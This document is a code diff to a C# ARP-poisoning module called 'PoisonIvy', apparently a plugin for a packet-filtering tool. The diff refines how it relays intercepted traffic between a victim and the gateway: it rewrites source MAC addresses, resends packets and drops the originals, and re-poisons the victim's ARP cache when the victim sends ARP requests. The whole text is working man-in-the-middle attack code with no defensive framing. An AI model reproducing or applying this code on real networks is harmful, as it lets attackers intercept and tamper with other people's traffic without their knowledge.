@@ -128,7 +128,7 @@ namespace PoisonIvy
             PacketMainReturn pmr;
             if (isPoisoning)
             {
-                if (in_packet.ContainsLayer(Protocol.Ethernet))
+                if (in_packet.ContainsLayer(Protocol.Ethernet) && !(in_packet.Outbound))
                 {
                     // check if the packet is from our USER; if it is, rewrite the destination MAC to the
                     // router MAC address
@@ -136,12 +136,14 @@ namespace PoisonIvy
                     if (new PhysicalAddress(packet.FromMac).ToString().Equals(from_mac.ToString()))
                     {
                         packet.ToMac = to_mac.GetAddressBytes();
+                        packet.FromMac = adapter.InterfaceInformation.GetPhysicalAddress().GetAddressBytes();
                         packet.Outbound = true;
-                        in_packet = packet;
 
-                        //System.Diagnostics.Debug.WriteLine("Routing to gateway");
+                        // send the packet and drop the pmr so the packet isn't processed any further
+                        adapter.SendPacket(packet);
+
                         pmr = new PacketMainReturn("PoisonIvy");
-                        pmr.returnType = PacketMainReturnType.Edited;
+                        pmr.returnType = PacketMainReturnType.Drop;
                         return pmr;
                     }
                     // check for the TO MAC address; if it's from our gateway, then it needs to be forwarded
@@ -150,17 +152,20 @@ namespace PoisonIvy
                     {
                         // swap out the MAC and forward it
                         packet.ToMac = from_mac.GetAddressBytes();
+                        packet.FromMac = adapter.InterfaceInformation.GetPhysicalAddress().GetAddressBytes();
                         packet.Outbound = true;
-                        in_packet = packet;
+
+                        // send the packet and drop the pmr so the packet isn't processed any further
+                        adapter.SendPacket(packet);
 
                         pmr = new PacketMainReturn("PoisonIvy");
-                        pmr.returnType = PacketMainReturnType.Edited;
+                        pmr.returnType = PacketMainReturnType.Drop;
                         return pmr;
                     }
                 }
 
                 // repoison if we catch the FROM or TO address making ARP requests to the opposite party
-                if (in_packet.ContainsLayer(Protocol.ARP))
+                if (in_packet.ContainsLayer(Protocol.ARP) && !(in_packet.Outbound))
                 {
                     ARPPacket request = (ARPPacket)in_packet;
                     // if it's from our FROM ip
@@ -201,7 +206,7 @@ namespace PoisonIvy
             /// grab the MAC and save it
             if (isWaitingFROM)
             {
-                if (in_packet.ContainsLayer(Protocol.IP))
+                if (in_packet.ContainsLayer(Protocol.IP) && !(in_packet.Outbound)) 
                 {
                     IPPacket packet = (IPPacket)in_packet;
                     if (packet.SourceIP.Equals(from))
@@ -216,7 +221,7 @@ namespace PoisonIvy
             // likewise above with TO address
             if (isWaitingTO)
             {
-                if (in_packet.ContainsLayer(Protocol.IP))
+                if (in_packet.ContainsLayer(Protocol.IP) && !(in_packet.Outbound))
                 {
                     IPPacket packet = (IPPacket)in_packet;
                     if (packet.SourceIP.Equals(to))
